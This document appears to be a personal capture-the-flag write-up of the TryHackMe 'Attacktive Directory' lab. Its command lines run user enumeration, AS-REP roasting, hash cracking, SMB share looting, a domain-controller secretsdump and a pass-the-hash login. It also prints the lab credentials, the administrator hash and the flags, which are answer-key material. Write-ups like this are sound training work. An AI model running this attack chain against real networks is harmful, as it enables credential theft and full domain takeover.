
Machine IP:  10.10.161.127

We have a scenario where we are provided with a username and password wordlist:

- https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
- https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

# Nmap Scanning:


```bash
nmap -Pn -sV -sC 10.10.161.127 -oN ./Nmap/nmap.init
```

![[./Images/Pasted image 20230928120810.png]]

# CME:


![[./Images/Pasted image 20230928120520.png]]
# Kerbrute:

```bash
/opt/kerbrute userenum userlist.txt -d spookysec.local --dc 10.10.161.127
```

![[./Images/Pasted image 20230928122954.png]]


Valid Accounts:
```
james
svc-admin
James
robin
darkstar
administrator
backup
paradox
JAMES
Robin
Administrator
Darkstar
Paradox
DARKSTAR
ori
ROBIN
```

# AS-Rep Roasting:

```bash
python3 /opt/impacket/examples/GetNPUsers.py 'spookysec.local/' -no-pass -dc-ip 10.10.161.127 -request -format hashcat -usersfile ./accounts
```

![[./Images/Pasted image 20230928123626.png]]

```bash
hashcat hash --wordlist /usr/share/wordlists/rockyou.txt
```

# CME:

Creds:
```
svc-admin:management2005
```

```bash
crackmapexec smb 10.10.161.127 -u 'svc-admin' -p 'management2005'
crackmapexec smb 10.10.161.127 -u 'svc-admin' -p 'management2005' --shares
crackmapexec smb 10.10.161.127 -u 'svc-admin' -p 'management2005' --users
```

![[./Images/Pasted image 20230928124050.png]]

![[./Images/Pasted image 20230928124206.png]]

# SMB Enumeration / TCP Port 445:

```
smbclient  //10.10.161.127/backup -U 'svc-admin%management2005'
```

![[./Images/Pasted image 20230928124434.png]]


Creds:

```
backup@spookysec.local:backup2517860
```

# Bloodhound:

```bash
python3 /opt/BloodHound.py/bloodhound.py -u 'backup' -p 'backup2517860' -c All -d spookysec.local --zip --dns-tcp -ns 10.10.161.127
```

![[./Images/Pasted image 20230928130251.png]]

![[./Images/Pasted image 20230928130946.png]]

# Secrets Dump:

```bash
python3 /opt/impacket/examples/secretsdump.py -just-dc backup@spookysec.local
```

![[./Images/Pasted image 20230928132600.png]]

Hashes:
```
Administrator:0e0363213e37b94221497260b0bcb4fc
```

# Evil-Winrm:

```bash
evil-winrm -i 10.10.161.127 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
```

![[./Images/Pasted image 20230928132821.png]]

# Targets:

![[./Images/Pasted image 20230928120207.png]]



# Flags:


```
svc-admin:TryHackMe{K3rb3r0s_Pr3_4uth
backup:TryHackMe{B4ckM3UpSc0tty!}
DA:TryHackMe{4ctiveD1rectoryM4st3r}
```